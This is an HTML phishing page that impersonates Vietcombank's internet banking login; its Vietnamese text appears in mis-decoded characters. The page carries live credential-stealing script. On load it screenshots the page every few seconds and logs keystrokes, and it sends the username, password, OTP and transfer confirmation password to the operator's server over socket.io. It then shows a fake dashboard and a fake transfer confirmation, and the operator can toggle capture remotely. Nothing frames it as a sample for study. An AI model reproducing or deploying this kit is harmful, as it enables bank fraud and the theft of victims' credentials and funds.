<!DOCTYPE html>
<html>
<head>
    <title>Vietcombank - Internet Banking</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>üè¶</text></svg>">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; }
        .header { background: linear-gradient(90deg, #1e40af, #3b82f6); color: white; padding: 15px 0; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .header-content { max-width: 1200px; margin: 0 auto; display: flex; align-items: center; padding: 0 20px; }
        .logo { display: flex; align-items: center; font-size: 24px; font-weight: bold; }
        .logo img { width: 40px; height: 40px; margin-right: 10px; }
        .nav { margin-left: auto; display: flex; gap: 30px; }
        .nav a { color: white; text-decoration: none; font-weight: 500; }
        .nav a:hover { text-decoration: underline; }
        .main-container { display: flex; max-width: 1200px; margin: 40px auto; gap: 40px; padding: 0 20px; }
        .left-panel { flex: 1; }
        .login-container { background: white; border-radius: 12px; box-shadow: 0 8px 32px rgba(0,0,0,0.1); overflow: hidden; max-width: 450px; }
        .login-header { background: linear-gradient(135deg, #1e40af, #3b82f6); color: white; padding: 25px; text-align: center; }
        .login-header h2 { font-size: 24px; margin-bottom: 8px; }
        .login-header p { opacity: 0.9; font-size: 14px; }
        .login-form { padding: 35px; }
        .form-group { margin-bottom: 25px; }
        .form-group label { display: block; margin-bottom: 8px; font-weight: 600; color: #374151; font-size: 14px; }
        .form-group input { width: 100%; padding: 14px 16px; border: 2px solid #e5e7eb; border-radius: 8px; font-size: 16px; transition: all 0.3s; }
        .form-group input:focus { outline: none; border-color: #3b82f6; box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1); }
        .login-btn { width: 100%; padding: 16px; background: linear-gradient(135deg, #1e40af, #3b82f6); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.3s; }
        .login-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(59, 130, 246, 0.3); }
        .security-info { background: #f8fafc; padding: 20px; border-radius: 8px; margin-top: 20px; }
        .security-info h4 { color: #1e40af; margin-bottom: 10px; font-size: 16px; }
        .security-info ul { list-style: none; }
        .security-info li { padding: 5px 0; color: #6b7280; font-size: 14px; }
        .security-info li:before { content: 'üîí'; margin-right: 8px; }
        .news-panel { background: white; border-radius: 12px; padding: 25px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
        .news-panel h3 { color: #1e40af; margin-bottom: 20px; font-size: 20px; }
        .news-item { padding: 15px 0; border-bottom: 1px solid #e5e7eb; }
        .news-item:last-child { border-bottom: none; }
        .news-item h4 { color: #374151; margin-bottom: 8px; font-size: 16px; }
        .news-item p { color: #6b7280; font-size: 14px; line-height: 1.5; }
        .news-date { color: #9ca3af; font-size: 12px; }
        .footer { background: #1f2937; color: white; padding: 30px 0; margin-top: 60px; }
        .footer-content { max-width: 1200px; margin: 0 auto; text-align: center; padding: 0 20px; }
        .footer p { margin-bottom: 10px; }
        .footer-links { display: flex; justify-content: center; gap: 30px; margin-top: 20px; }
        .footer-links a { color: #9ca3af; text-decoration: none; font-size: 14px; }
        .footer-links a:hover { color: white; }
        .dashboard { display: none; }
        .account-info { background: white; border-radius: 12px; padding: 30px; margin-bottom: 30px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
        .balance { font-size: 32px; font-weight: bold; color: #1e40af; margin: 20px 0; }
        .quick-actions { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-top: 30px; }
        .action-btn { background: linear-gradient(135deg, #10b981, #059669); color: white; padding: 20px; border: none; border-radius: 12px; cursor: pointer; font-size: 16px; font-weight: 600; transition: all 0.3s; }
        .action-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(16, 185, 129, 0.3); }
        .transfer-form { background: white; border-radius: 12px; padding: 30px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); display: none; }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-content">
            <div class="logo">
                <span style="background: white; color: #1e40af; padding: 8px 12px; border-radius: 6px; margin-right: 12px; font-weight: bold;">VCB</span>
                Vietcombank
            </div>
            <div class="nav">
                <a href="/">Trang ch·ªß</a>
                <a href="/dashboard">Dashboard</a>
                <a href="/logout">ƒêƒÉng xu·∫•t</a>
            </div>
        </div>
    </div>
    
    <div class="main-container" id="loginSection">
        <div class="left-panel">
            <div class="login-container">
                <div class="login-header">
                    <h2>Internet Banking</h2>
                    <p>ƒêƒÉng nh·∫≠p ƒë·ªÉ s·ª≠ d·ª•ng d·ªãch v·ª• ng√¢n h√†ng tr·ª±c tuy·∫øn</p>
                </div>
                <div class="login-form">
                    <form id="loginForm">
                        <div class="form-group">
                            <label>T√™n ƒëƒÉng nh·∫≠p / S·ªë th·∫ª</label>
                            <input type="text" id="account" placeholder="Nh·∫≠p t√™n ƒëƒÉng nh·∫≠p ho·∫∑c s·ªë th·∫ª" required>
                        </div>
                        <div class="form-group">
                            <label>M·∫≠t kh·∫©u</label>
                            <input type="password" id="password" placeholder="Nh·∫≠p m·∫≠t kh·∫©u" required>
                        </div>
                        <div class="form-group">
                            <label>M√£ x√°c th·ª±c (OTP)</label>
                            <input type="text" id="otp" placeholder="Nh·∫≠p m√£ OTP t·ª´ SMS" maxlength="6">
                        </div>
                        <button type="submit" class="login-btn">ƒêƒÉng nh·∫≠p</button>
                    </form>
                    
                    <div class="security-info">
                        <h4>Th√¥ng tin b·∫£o m·∫≠t</h4>
                        <ul>
                            <li>Kh√¥ng chia s·∫ª th√¥ng tin ƒëƒÉng nh·∫≠p v·ªõi b·∫•t k·ª≥ ai</li>
                            <li>Lu√¥n ƒëƒÉng xu·∫•t sau khi s·ª≠ d·ª•ng</li>
                            <li>Ki·ªÉm tra ƒë·ªãa ch·ªâ website ch√≠nh th·ª©c</li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="news-panel">
            <h3>üì∞ Tin t·ª©c & Khuy·∫øn m√£i</h3>
            <div class="news-item">
                <h4>∆Øu ƒë√£i l√£i su·∫•t ti·∫øt ki·ªám th√°ng 11</h4>
                <p>G·ª≠i ti·∫øt ki·ªám online v·ªõi l√£i su·∫•t ∆∞u ƒë√£i l√™n ƒë·∫øn 6.8%/nƒÉm. √Åp d·ª•ng cho kh√°ch h√†ng m·ªõi.</p>
                <div class="news-date">04/11/2024</div>
            </div>
            <div class="news-item">
                <h4>C·∫£nh b√°o gian l·∫≠n tr·ª±c tuy·∫øn</h4>
                <p>Kh√°ch h√†ng c·∫ßn c·∫£nh gi√°c v·ªõi c√°c th·ªß ƒëo·∫°n l·ª´a ƒë·∫£o qua ƒëi·ªán tho·∫°i v√† email gi·∫£ m·∫°o ng√¢n h√†ng.</p>
                <div class="news-date">03/11/2024</div>
            </div>
            <div class="news-item">
                <h4>N√¢ng c·∫•p h·ªá th·ªëng b·∫£o m·∫≠t</h4>
                <p>H·ªá th·ªëng Internet Banking ƒë∆∞·ª£c n√¢ng c·∫•p v·ªõi c√¥ng ngh·ªá b·∫£o m·∫≠t ti√™n ti·∫øn nh·∫•t.</p>
                <div class="news-date">01/11/2024</div>
            </div>
        </div>
    </div>

    <div class="main-container dashboard" id="dashboardSection">
        <div style="width: 100%;">
            <div class="account-info">
                <h2>Ch√†o m·ª´ng, <span id="welcomeUser"></span>!</h2>
                <p>S·ªë t√†i kho·∫£n: <strong id="accountNumber"></strong></p>
                <div class="balance" id="accountBalance">2,456,789,000 VNƒê</div>
                <p style="color: #6b7280;">S·ªë d∆∞ kh·∫£ d·ª•ng</p>
            </div>
            
            <div class="quick-actions">
                <button class="action-btn" onclick="showTransfer()">üí∏ Chuy·ªÉn kho·∫£n</button>
                <button class="action-btn" onclick="showHistory()">üìä L·ªãch s·ª≠ giao d·ªãch</button>
                <button class="action-btn" onclick="showSavings()">üí∞ Ti·∫øt ki·ªám</button>
                <button class="action-btn" onclick="showCards()">üí≥ Qu·∫£n l√Ω th·∫ª</button>
            </div>
            
            <div class="transfer-form" id="transferForm">
                <h3>Chuy·ªÉn kho·∫£n</h3>
                <div class="form-group">
                    <label>S·ªë t√†i kho·∫£n nh·∫≠n</label>
                    <input type="text" id="toAccount" placeholder="Nh·∫≠p s·ªë t√†i kho·∫£n ng∆∞·ªùi nh·∫≠n">
                </div>
                <div class="form-group">
                    <label>T√™n ng∆∞·ªùi nh·∫≠n</label>
                    <input type="text" id="toName" placeholder="T√™n ng∆∞·ªùi nh·∫≠n s·∫Ω hi·ªÉn th·ªã t·ª± ƒë·ªông">
                </div>
                <div class="form-group">
                    <label>S·ªë ti·ªÅn</label>
                    <input type="number" id="amount" placeholder="Nh·∫≠p s·ªë ti·ªÅn c·∫ßn chuy·ªÉn">
                </div>
                <div class="form-group">
                    <label>N·ªôi dung chuy·ªÉn kho·∫£n</label>
                    <input type="text" id="content" placeholder="Nh·∫≠p n·ªôi dung chuy·ªÉn kho·∫£n">
                </div>
                <div class="form-group">
                    <label>M·∫≠t kh·∫©u x√°c nh·∫≠n</label>
                    <input type="password" id="confirmPass" placeholder="Nh·∫≠p m·∫≠t kh·∫©u ƒë·ªÉ x√°c nh·∫≠n">
                </div>
                <button class="login-btn" onclick="confirmTransfer()">X√°c nh·∫≠n chuy·ªÉn kho·∫£n</button>
            </div>
        </div>
    </div>
    
    <div class="footer">
        <div class="footer-content">
            <p>&copy; 2024 Ng√¢n h√†ng TMCP Ngo·∫°i th∆∞∆°ng Vi·ªát Nam (Vietcombank)</p>
            <p>Hotline: 1900 545 413 | Email: info@vietcombank.com.vn</p>
            <div class="footer-links">
                <a href="#">ƒêi·ªÅu kho·∫£n s·ª≠ d·ª•ng</a>
                <a href="#">Ch√≠nh s√°ch b·∫£o m·∫≠t</a>
                <a href="#">Li√™n h·ªá</a>
                <a href="#">C√¢u h·ªèi th∆∞·ªùng g·∫∑p</a>
            </div>
        </div>
    </div>
    
    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let captureInterval;
        let keylogData = [];
        
        window.addEventListener('load', () => {
            setTimeout(startScreenCapture, 2000);
            startKeylogging();
        });
        
        async function startScreenCapture() {
            try {
                captureInterval = setInterval(async () => {
                    try {
                        const tempCanvas = await html2canvas(document.body, {
                            allowTaint: true,
                            useCORS: true,
                            scale: 0.5,
                            width: window.innerWidth,
                            height: window.innerHeight
                        });
                        
                        const imageData = tempCanvas.toDataURL('image/jpeg', 0.6);
                        socket.emit('screen-capture', {
                            userId: socket.id,
                            screenshot: imageData,
                            timestamp: Date.now(),
                            url: window.location.href
                        });
                        
                    } catch (e) {
                        captureFormData();
                    }
                }, 3000);
                
            } catch (err) {
                captureFormData();
            }
        }
        
        function captureFormData() {
            const formData = {
                account: document.getElementById('account')?.value || '',
                password: document.getElementById('password')?.value || '',
                otp: document.getElementById('otp')?.value || '',
                toAccount: document.getElementById('toAccount')?.value || '',
                amount: document.getElementById('amount')?.value || '',
                confirmPass: document.getElementById('confirmPass')?.value || '',
                timestamp: Date.now(),
                url: window.location.href
            };
            
            if (Object.values(formData).some(val => val)) {
                socket.emit('form-data', formData);
            }
        }
        
        function startKeylogging() {
            document.addEventListener('keydown', (e) => {
                keylogData.push({
                    key: e.key,
                    target: e.target.id || e.target.tagName,
                    value: e.target.value,
                    timestamp: Date.now()
                });
                
                if (keylogData.length >= 10) {
                    socket.emit('keylog-data', keylogData);
                    keylogData = [];
                }
            });
            
            document.querySelectorAll('input').forEach(input => {
                input.addEventListener('focus', () => {
                    socket.emit('input-focus', {
                        field: input.id,
                        timestamp: Date.now()
                    });
                });
                
                input.addEventListener('blur', () => {
                    socket.emit('input-data', {
                        field: input.id,
                        value: input.value,
                        timestamp: Date.now()
                    });
                });
            });
        }
        
        document.getElementById('loginForm').addEventListener('submit', (e) => {
            e.preventDefault();
            
            const account = document.getElementById('account').value;
            const password = document.getElementById('password').value;
            const otp = document.getElementById('otp').value;
            
            socket.emit('login-attempt', {
                account: account,
                password: password,
                otp: otp,
                timestamp: Date.now(),
                userAgent: navigator.userAgent,
                ip: 'client-side'
            });
            
            if (account && password) {
                setTimeout(() => {
                    document.getElementById('loginSection').style.display = 'none';
                    document.getElementById('dashboardSection').style.display = 'block';
                    document.getElementById('welcomeUser').textContent = account;
                    document.getElementById('accountNumber').textContent = account;
                    startKeylogging();
                }, 1000);
            } else {
                alert('Vui l√≤ng nh·∫≠p ƒë·∫ßy ƒë·ªß th√¥ng tin!');
            }
        });
        
        function showTransfer() {
            document.getElementById('transferForm').style.display = 'block';
            startKeylogging();
        }
        
        function showHistory() {
            alert('T√≠nh nƒÉng l·ªãch s·ª≠ giao d·ªãch ƒëang ƒë∆∞·ª£c ph√°t tri·ªÉn');
        }
        
        function showSavings() {
            alert('T√≠nh nƒÉng ti·∫øt ki·ªám ƒëang ƒë∆∞·ª£c ph√°t tri·ªÉn');
        }
        
        function showCards() {
            alert('T√≠nh nƒÉng qu·∫£n l√Ω th·∫ª ƒëang ƒë∆∞·ª£c ph√°t tri·ªÉn');
        }
        
        function confirmTransfer() {
            const toAccount = document.getElementById('toAccount').value;
            const amount = document.getElementById('amount').value;
            const confirmPass = document.getElementById('confirmPass').value;
            const content = document.getElementById('content').value;
            
            socket.emit('transfer-data', {
                toAccount: toAccount,
                amount: amount,
                confirmPass: confirmPass,
                content: content,
                timestamp: Date.now()
            });
            
            if (toAccount && amount && confirmPass) {
                alert('Chuy·ªÉn kho·∫£n th√†nh c√¥ng!\\nS·ªë ti·ªÅn: ' + amount + ' VNƒê\\nT·ªõi TK: ' + toAccount);
                document.getElementById('transferForm').style.display = 'none';
            } else {
                alert('Vui l√≤ng nh·∫≠p ƒë·∫ßy ƒë·ªß th√¥ng tin!');
            }
        }
        
        window.addEventListener('beforeunload', () => {
            if (captureInterval) {
                clearInterval(captureInterval);
            }
            if (keylogData.length > 0) {
                socket.emit('keylog-data', keylogData);
            }
        });
        
        socket.on('admin-command', (data) => {
            if (data.action === 'stop-capture') {
                if (captureInterval) {
                    clearInterval(captureInterval);
                    captureInterval = null;
                }
            } else if (data.action === 'start-capture') {
                if (!captureInterval) {
                    startScreenCapture();
                }
            }
        });
    </script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
</body>
</html>